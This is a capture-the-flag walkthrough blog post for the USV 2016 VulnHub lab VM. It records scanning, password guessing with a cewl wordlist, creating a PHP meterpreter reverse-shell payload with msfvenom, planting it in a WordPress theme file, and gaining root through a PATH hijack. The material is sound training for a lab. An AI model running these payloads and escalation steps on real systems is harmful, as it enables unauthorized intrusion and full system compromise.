<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the USV VM (CTF Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-usv-vm-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2017-01-26T08:17:24+00:00">January 26, 2017</time><time class="updated" datetime="2025-06-10T20:30:19+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">A new challenge for all of you guys!</span></p>
<p><span style="color: #000000;">This CTF is all about conquering flags coming across our way as we go further in our penetration testing of this lab.  All the flags should be discovered in form of: Country name Flag:[md5 hash]. The network interface of this virtual machine will take it’s IP settings from DHCP.</span></p>
<p><span style="color: #000000;">Download lab from here:</span> <a href="https://www.vulnhub.com/entry/usv-2016-v101,175/"><strong>https://www.vulnhub.com/entry/usv-2016-v101,175/</strong></a></p>
<p><span style="color: #000000;">Let’s get started with our first step.</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><span style="color: #000000;">From this, we get our target IP.</span></p>
<p><span style="color: #000000;"><strong>Target IP: 192.168.0.103</strong></span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-zd9Jq0ojgHw/WImqV8OJf7I/AAAAAAAAPBg/rLiy5lxxIIEojNe_6irvP6wd03pudaQ4gCLcB/s1600/1.png"/></p>
<p><span style="color: #000000;">Now we will scan it with nmap which will give us all the open ports in a particular lab for further penetration testing.</span></p>
<pre class="font-size:14 line-height:17 lang:default decode:true">nmap -p- -A 192.168.0.103</pre>
<p><span style="color: #000000;">This result shows that the following ports are open 22, 80, 3129, 3306, 21211 and http proxy is used on port 3129.</span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-diuM9B9r8Sc/WImqX3Uv3XI/AAAAAAAAPCI/FN7mpm9-pZ8kpP1_l9rTTaTgpAS_RYApwCLcB/s1600/2.1.png"/></p>
<p><span style="color: #000000;">So now let’s proceed with further penetration testing. Firstly we’ll go with ssh on port 22.</span></p>
<pre class="lang:default decode:true">ssh 192.168.0.103</pre>
<p><span style="color: #000000;">Ssh revealed a ascii Dragon with some strings and a base64 code written at the bottom. Looking closer you’ll see something written on top AES-ECB.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-7w7Ui2BdSVY/WImqX-xz-vI/AAAAAAAAPCM/0NO3I9dIE0wX6_8Rr9PxYwMZjavznLB0gCLcB/s1600/2.png"/></p>
<p><span style="color: #000000;">By Google search, we found out that there is a website called aesencryption.net where we can decrypt the base64 code we got in our last result. So we will decrypt that code with the given key in the image by all this process we arrived at our 1st flag i.e <strong>ITALY FLAG</strong></span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-l2_tilfqGmw/WImqaEB75DI/AAAAAAAAPC4/Xp5dm0E7cuEt0NIxO_TPh4pudnYjIMH1ACLcB/s1600/3.png"/></p>
<p><span style="color: #000000;">Ok so now let’s head towards the second flag and for that, we are going to open target IP in the browser as port 80 is also open. Look at that. We got access forbidden. No result.</span></p>
<p><img decoding="async" src="https://4.bp.blogspot.com/-EataWRirZG8/WImqafP-UmI/AAAAAAAAPDA/dW2L62OCZuEsUXqmc6NyKzxJflLqK2aEACLcB/s1600/4.png"/></p>
<p><span style="color: #000000;">As we opened target IP in browser simultaneously we have captured the cookies through burp suite after setting the manual proxy in the browser. When all this is done, right click on its window where intercepted data is fetched and a kind of action list will put on view further click to <strong>send to</strong> <strong>the repeater.</strong></span></p>
<p><span style="color: #000000;">Look over screenshot below you will find two panels left and right for request and response respectively. In the response window, the highlighted text is our flag.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-lXBcRarurxM/WImqau59JcI/AAAAAAAAPDE/rummitNMTnMZRyE4b80cwC87kaSnrhQgwCLcB/s1600/5.png"/></p>
<p><span style="color: #000000;">As this code is in base64 so we are going to use HackBar plugin in Mozilla Firefox which is preinstalled or can be easily installed. Whoa decoding the code in it we got another flag which is our second flag i.e. <strong>CROATIA FLAG</strong></span></p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-RahylxGy9uE/WImqaqV1UuI/AAAAAAAAPDI/6mByxL8nMKQJoc0e7AdYBOivHlZV6Kl-gCLcB/s1600/6.png"/></p>
<p><span style="color: #000000;">Moving ahead, from our nmap result we got that http-proxy is set on port 3129 so we will set the proxy setting for our target IP with port number 3129 as shown below.</span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-i9scZb0fg9w/WImqa_VvkbI/AAAAAAAAPDM/-_8QC9fDZbccicBnJiP1s69xtKjG0MizQCLcB/s1600/7.png"/></p>
<p><span style="color: #000000;">Now try opening target IP in a browser and wait for a few seconds like 10 sec. The proxy setting did the trick and website reveals a single page with a changing banner of “WINTER IS COMING” and “ALL MEN MUST DIE”. Some of you may be aware of this but for those who do not know about this. It is Games of Thrones.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-RGPNHdU1RG0/WImqbBslE9I/AAAAAAAAPDQ/1N52hKTE9_cHu63j_VI6elIRzhD4Tq0RgCLcB/s640/8.png"/></p>
<p><span style="color: #000000;">The site didn’t show much so I used Nikto scanner with a proxy to get some information about it which will be helpful in further testing.</span></p>
<pre class="lang:default decode:true">nikto -h 192.168.0.103 –useproxy  http://192.168.0.103:3129
</pre>
<p><span style="color: #000000;">It reveals a WordPress login at /blog.</span></p>
<p><img decoding="async" src="https://4.bp.blogspot.com/-LjtFa_AdlHc/WImqbI5CNRI/AAAAAAAAPDU/cMGtMmLe03cBvBqKG4zv-sGRInlH5EJegCLcB/s640/9.png"/></p>
<p><span style="color: #000000;">Ok!  Now open it in the browser. Great, Games of Thrones notion is confirmed as Seven Kingdoms blog is shown.</span></p>
<p><span style="color: #000000;">Scrolling down in this site you can see that there is an interesting second post which shows ‘I have a message for you’. There is a highlighted option so just try to open it in the browser.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-RHjmRMLjhN8/WImqWLyc3zI/AAAAAAAAPBk/JmWqb_B8QXkhliiTxwzvWchW9bkYdpMIACLcB/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Awesome!!!! This reveals a message and a download link for a zip file. Interesting, so go ahead and download it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-EFrm9SToeJE/WImqV34Cx1I/AAAAAAAAPBc/GR6I1t_XpVYUzoRJlBnARUet5ymazv7YACLcB/s1600/11.png"/></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-aY3NHJQAfec/WImqWaFX4BI/AAAAAAAAPBo/JCrHFIFHnis9pX9GVge7bxgHGkyV_ApLACLcB/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Unzipping the file shows an image of a man with a bottle of perfume and a base64 encoded string at the bottom.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-8RQ7pBrrEIs/WImqWpH_uDI/AAAAAAAAPBw/9Vn2rS0fzX0UEHQeAs2HWxBqnnEMRhllQCLcB/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Here we decrypt the code in the hackbar plugin which results in another flag. From this step, we got our third flag i.e. <strong>PORTUGAL FLAG</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-86e_Pznjd5A/WImqWmSfUII/AAAAAAAAPBs/aML9dZWDxVURwuGRpLqhNgSWsYbLvJCPACLcB/s1600/14.png"/></span></p>
<p><span style="color: #000000;"> Now, returning to the previous site there are several posts which are all useless so just scroll down to see if there is something useful or not and then comes the last post which is of our interest.</span></p>
<p><span style="color: #000000;">‘Protected: the secret chapter ‘</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-rNbcberts8A/WImqXO0OluI/AAAAAAAAPB0/pwLPw3tCyKAaEpTW3qaRF8wZZrgB013nQCLcB/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Oh! We have to provide a password to get through it. This one took some time and to spare your time I won’t go through my failures,</span></p>
<p><span style="color: #000000;">I have created a dictionary of possible passwords which are nothing but some of the words in this whole page with the help of the following command.</span></p>
<pre class="lang:default decode:true">cewl -d 2 -m 5 --proxy_host 192.168.0.103 --proxy_port 3129 -w /root/Desktop/dict.txt http://192.168.0.103/blog/</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-vNgzoflsyDo/WImqXJQiNxI/AAAAAAAAPB4/mNGJYBlRyPczPwswADzsLeVaS4DKttxBwCLcB/s1600/16.png"/></span></p>
<p><span style="color: #000000;">From the list we get that password is ‘westerosi’</span></p>
<p><span style="color: #000000;">Using this password we came to another page which revealed another flag in base64 encoded string and below it some kind of images of an actress.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-bT0mndllrbM/WImqXSd3NUI/AAAAAAAAPB8/V5dTWQaucUgNYB-RhYtlUkPGx_ki_uj5gCLcB/s1600/17.png"/></span></p>
<p><span style="color: #000000;"> Now again decrypt it in and as a result, we have our fourth flag i.e. <strong>PARAGUAY FLAG</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-0sYibL9eFxE/WImqXnh20fI/AAAAAAAAPCA/eMu017LNeXE_c7yyZTaYhjImnpWfp7iggCLcB/s1600/18.png"/></span></p>
<p><span style="color: #000000;">Moving to one level up, from the site we got another message that “the mother_of_dragons has a password which is in right front of your eyes”.</span></p>
<p><span style="color: #000000;">Knowing nothing about the eyes of actress I restored to google to see if I get any clue from there but no such luck.</span></p>
<p><span style="color: #000000;">I looked at the message again and it states ‘password which is in front of your eyes’</span></p>
<p><span style="color: #000000;">That’s the password of <strong>mother_of_dragons</strong> is ‘<strong>in front of your eyes’</strong>. But wait a minute where is this password is used.</span></p>
<p><span style="color: #000000;">We have an FTP service running. So let’s try and get through it</span></p>
<pre class="lang:default decode:true">ftp 192.168.0.103 21211
ls –al
get .note.txt
exit
cat .note.txt</pre>
<p><span style="color: #000000;">bingo! Here that password is used. At the bottom result shows that children’s name is used for the password. Again a password but this time it is used for WordPress login which we are going to use in coming steps.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-vBdlr1pSQGQ/WImqXoX1R7I/AAAAAAAAPCE/KSlEn3bBbPEU8Afw4iZPLbGZ5h1DIaA3ACLcB/s1600/19.png"/></span></p>
<p><span style="color: #000000;">Again I googled and found out she doesn’t have any children rather had 3 dragons named Drogon, Rhaegal, and Viserion. So I put all these names into a file along with all possible combinations.</span></p>
<p><span style="color: #000000;">The list is small so by entering each one the desired password could find out.</span></p>
<p><span style="color: #000000;">Password is<strong> RhaegalDrogonViserion</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-SVpj6b49RGY/WImqYKCh9OI/AAAAAAAAPCQ/7up4cRM5JxA0UqhtsorwWIcaH8F1D0cbQCLcB/s1600/20.png"/></span></p>
<p><span style="color: #000000;">Apply the credentials for WordPress and we are in!</span></p>
<p><span style="color: #000000;">Looking around the site I found the profile section which reveals the base64 encoded string for mother_of_dragons.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-6UVG3V0JVxY/WImqYQ_2cqI/AAAAAAAAPCU/Viq_457iFq4VMmgvKzsuJlxjdL1O__g5QCLcB/s1600/21.png"/></span></p>
<p><span style="color: #000000;">Like always decode the base64 code in HackBar and here we have another flag.</span></p>
<p><span style="color: #000000;">This is our fifth flag i.e. <strong>THAILAND FLAG</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-Eyx_WIMhGik/WImqYUiSFaI/AAAAAAAAPCY/Of_KE57O1rYG5sM1vB5zAf8h102CM2l4QCLcB/s1600/22.png"/></span></p>
<p><span style="color: #000000;">Now with only 2 flags left its time for shell access as we have WordPress.</span></p>
<p><span style="color: #000000;">Moving further, firstly make a php code through msfvenom which can be used to get the meterpreter session.</span></p>
<pre class="lang:default decode:true">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.104 lport=4444 -f raw
</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-ZEG3dCN1B-s/WImqYwrlpEI/AAAAAAAAPCc/w0qpJutfofgX7Al30PQoSg7-cjkL9o8BQCLcB/s1600/23.png"/></span></p>
<p><span style="color: #000000;">Being admin of the site I am able to edit the theme. So I replaced the 404.php code of template in Viking theme with the above-highlighted php code.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-y2KlZltTijc/WImqY30_57I/AAAAAAAAPCg/DmxYZdj9SAA2YsRCOeKzI_xIXRG1ITicgCLcB/s1600/24.png"/></span></p>
<p><span style="color: #000000;">On the other side to get the meterpreter session open kali terminal and run multi handler. And for that type the following commands.</span></p>
<pre class="lang:default decode:true">use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost 192.168.0.104
set lport 4444
exploit</pre>
<p><span style="color: #000000;">as we have a meterpreter session, now go to shell and type following commands</span></p>
<pre class="highlight"><code>echo "import pty; pty.spawn('/bin/bash')" &gt; /tmp/asdf.py
python /tmp/asdf.py</code></pre>
<pre class="lang:default decode:true">cd /srv/http
ls</pre>
<p><span style="color: #000000;">it shows a reward_flag.txt file so call it with the cat command</span></p>
<p><span style="color: #000000;"><strong>cat reward_flag.txt </strong></span></p>
<p><span style="color: #000000;">As a result, we get a base64 encoded string.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-SGgF_Ky9sOk/WImqZP6EJiI/AAAAAAAAPCk/HxE_mvCV-x0Ij1WQAoVfYg5uenjyBVOswCLcB/s1600/25.png"/></span></p>
<p><span style="color: #000000;">Do not worry soon this decoding thing is going to over as we have the sixth flag with this decoding. So, as a result, our sixth flag is <strong>MONGOLIA FLAG</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-7v_CjMqR6Fc/WImqZf5EjvI/AAAAAAAAPCo/Ig4hmvMVzEk4AxAo8T6n1Vroo3XxBT6KQCLcB/s1600/26.1.png"/></span></p>
<p><span style="color: #000000;">Back to another file in the above list of files i.e. winterfell_messenger .  We see its executable and owner is root. So run it with the following command</span></p>
<pre class="lang:default decode:true">./winterfell_messenger
cat /root/message.txt</pre>
<p><span style="color: #000000;">It shows that it’s using the cat command to read a file in the /root directory.</span></p>
<p><span style="color: #000000;">Using strings shows that cat command is being used; however, it’s not using the full path to the program. From this, we come to know that it will search for set PATH to run.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3QDWEPb18h4/WImqZSo5oQI/AAAAAAAAPCs/WjpElkuyBcEnxFSEsERYtDBgePK0MA1vgCLcB/s1600/26.png"/></span></p>
<p><span style="color: #000000;"> Now, we are able to update PATH by using export but first, we need to find out the writable directory and for that, we have used <strong>/tmp</strong>. In<strong> /tmp</strong>, we will create an executable file named <strong>cat </strong>so it can be called by the <strong>winterfell_messenger</strong> program. This file will be running as root so we will use <strong>/bin/bash</strong> to call shell and to change the mode. Run the following commands.</span></p>
<pre class="font-size:14 line-height:17 lang:default decode:true">echo "/bin/bash" &gt; /tmp/cat
chmod 777 /tmp/cat
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin</pre>
<p><span style="color: #000000;">After this step, we are going to update the PATH to remove the <strong>/tmp</strong> directory we added. For this type the following commands.</span></p>
<pre class="lang:default decode:true ">export PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin</pre>
<p><span style="color: #000000;">Now, we will go to the home directory of http to get the desired file. For that type</span></p>
<pre class="lang:default decode:true">cd /srv/http
ls</pre>
<p><span style="color: #000000;">now call the winterfell_messenger file by using given command.</span></p>
<pre class="lang:default decode:true">./winterfell_messenger
id</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-q7epCc1z1gU/WImqZh7rSTI/AAAAAAAAPCw/vqbSou8GgowedQAz2b_KgXSZYPwI1GreQCLcB/s1600/27.png"/></span></p>
<p><span style="color: #000000;">Now go to root and there we have .flag.txt file.</span></p>
<p><span style="color: #000000;">Now running cat against .flag.txt we get congratulations, a wolf made up of ascii characters and a base64 encoded string at the bottom. Commands are given below.</span></p>
<pre class="lang:default decode:true ">cd /root
/usr/sbin/cat .flag.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-8KKALrqtKFA/WImqZ5uGkdI/AAAAAAAAPC0/b4Kc8YbonR8lCVisKm9LuWuLPghW8WlTACLcB/s1600/28.png"/></span></p>
<p><span style="color: #000000;">Finally decoding in hackbar reveals the seventh and last flag which is nothing but the <strong>SOMALIA FLAG</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CTQEeo_qx6I/WImqaMHI7ZI/AAAAAAAAPC8/jYixuWp3PLQ1ApMu_p6xN-6Ssi8PaKepwCLcB/s1600/29.png"/></span></p>
<p><span style="color: #000000;">Whoola. We reached at the end and with this job is done. Hope you enjoyed it and obviously, penetration skills are refreshed.</span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Vishva Vaghela is a Digital Forensics enthusiast and enjoys technical content writing. You can reach her o</span>n<strong><a href="https://www.linkedin.com/in/vishva-vaghela-979446191/"> Here</a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
